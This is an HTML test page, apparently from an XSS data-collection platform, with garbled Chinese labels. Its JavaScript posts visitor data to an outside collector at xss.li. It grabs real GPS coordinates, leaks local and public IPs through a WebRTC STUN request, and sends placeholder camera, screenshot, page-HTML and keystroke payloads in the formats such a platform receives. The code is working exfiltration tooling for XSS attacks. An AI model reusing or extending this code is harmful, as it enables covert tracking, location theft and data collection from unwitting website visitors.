<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payloadæµ‹è¯•é¡µé¢</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 800px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .test-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }
        .test-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .log {
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .log-item {
            padding: 5px;
            border-bottom: 1px solid #e0e0e0;
        }
        .log-success { color: #28a745; }
        .log-error { color: #dc3545; }
        .log-info { color: #17a2b8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ§ª XSS Payloadæµ‹è¯•å·¥å…·</h1>
        <p class="subtitle">æµ‹è¯•å„ç§XSS Payloadæ˜¯å¦èƒ½æ­£å¸¸å‘é€æ•°æ®åˆ°åå°</p>
        
        <div class="test-grid">
            <button class="test-btn" onclick="testBasic()">
                ğŸ“ åŸºç¡€æµ‹è¯•
            </button>
            <button class="test-btn" onclick="testCamera()">
                ğŸ“· æ‘„åƒå¤´æ‹ç…§
            </button>
            <button class="test-btn" onclick="testGPS()">
                ğŸ“ GPSå®šä½
            </button>
            <button class="test-btn" onclick="testIP()">
                ğŸŒ çœŸå®IPæ£€æµ‹
            </button>
            <button class="test-btn" onclick="testScreenshot()">
                ğŸ“¸ è¶…çº§æˆªå±
            </button>
            <button class="test-btn" onclick="testRDP()">
                ğŸ–¥ï¸ RDPæ§åˆ¶
            </button>
        </div>
        
        <div class="log" id="log"></div>
    </div>

    <script>
        const API_URL = 'https://xss.li/api/collect.php';
        
        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            const item = document.createElement('div');
            item.className = 'log-item log-' + type;
            item.textContent = new Date().toLocaleTimeString() + ' - ' + message;
            log.appendChild(item);
            log.scrollTop = log.scrollHeight;
        }
        
        async function sendData(payload) {
            try {
                addLog('ğŸ“¤ å‘é€æ•°æ®: ' + payload.type, 'info');
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                const result = await response.json();
                if (result.status === 'success') {
                    addLog('âœ… å‘é€æˆåŠŸ: ' + result.message, 'success');
                    addLog('ğŸ“‹ æ—¥å¿—ID: ' + result.id, 'info');
                } else {
                    addLog('âŒ å‘é€å¤±è´¥: ' + result.message, 'error');
                }
            } catch (error) {
                addLog('ğŸ’¥ é”™è¯¯: ' + error.message, 'error');
            }
        }
        
        function testBasic() {
            sendData({
                type: 'basic_test',
                message: 'è¿™æ˜¯ä¸€æ¡æµ‹è¯•æ•°æ®',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
            });
        }
        
        function testCamera() {
            addLog('ğŸ“· æ¨¡æ‹Ÿæ‘„åƒå¤´æ•°æ®(å®é™…åº”ç”¨éœ€è¯·æ±‚æƒé™)', 'info');
            sendData({
                type: 'camera_capture',
                photo: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABA...(æ¨¡æ‹Ÿæ•°æ®)',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href
            });
        }
        
        function testGPS() {
            if (!navigator.geolocation) {
                addLog('âŒ æµè§ˆå™¨ä¸æ”¯æŒGPSå®šä½', 'error');
                return;
            }
            
            addLog('ğŸ“ æ­£åœ¨è·å–GPSä½ç½®...', 'info');
            navigator.geolocation.getCurrentPosition(
                position => {
                    sendData({
                        type: 'gps_location',
                        gps: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        },
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        googleMapsUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    });
                },
                error => {
                    addLog('âŒ GPSå®šä½å¤±è´¥: ' + error.message, 'error');
                }
            );
        }
        
        function testIP() {
            addLog('ğŸŒ æ­£åœ¨æ£€æµ‹çœŸå®IP...', 'info');
            
            const ipData = {
                localIPs: [],
                publicIPs: [],
                ipv6IPs: []
            };
            
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate) return;
                
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = ipRegex.exec(ice.candidate.candidate);
                
                if (match) {
                    const ip = match[1];
                    if (ip.indexOf('192.168.') === 0 || ip.indexOf('10.') === 0) {
                        ipData.localIPs.push(ip);
                    } else {
                        ipData.publicIPs.push(ip);
                    }
                    
                    sendData({
                        type: 'ip_detect',
                        ips: ipData,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        userAgent: navigator.userAgent
                    });
                    
                    pc.close();
                }
            };
        }
        
        function testScreenshot() {
            addLog('ğŸ“¸ æ¨¡æ‹Ÿè¶…çº§æˆªå±æ•°æ®', 'info');
            sendData({
                type: 'super_screenshot',
                screenshot: {
                    screenshot: 'data:image/jpeg;base64,/9j/4AAQ...(æ¨¡æ‹Ÿæˆªå›¾)',
                    dimensions: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    }
                },
                source: {
                    html: document.documentElement.outerHTML.substring(0, 500) + '...',
                    title: document.title,
                    url: window.location.href
                },
                metadata: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timestamp: new Date().toISOString()
                }
            });
        }
        
        function testRDP() {
            addLog('ğŸ–¥ï¸ æ¨¡æ‹ŸRDPæ§åˆ¶æ•°æ®', 'info');
            sendData({
                type: 'rdp_control',
                screen: {
                    screenshot: 'data:image/jpeg;base64,/9j/4AAQ...(æ¨¡æ‹Ÿæˆªå›¾)',
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        scrollX: window.scrollX,
                        scrollY: window.scrollY
                    },
                    timestamp: Date.now()
                },
                events: [
                    { type: 'keyboard', action: 'keydown', key: 'a', timestamp: Date.now() },
                    { type: 'mouse', action: 'click', x: 100, y: 200, timestamp: Date.now() }
                ],
                session: {
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    title: document.title
                },
                timestamp: new Date().toISOString()
            });
        }
        
        addLog('âœ¨ æµ‹è¯•å·¥å…·å·²å°±ç»ª', 'success');
        addLog('ğŸ“¡ APIåœ°å€: ' + API_URL, 'info');
    </script>
</body>
</html>
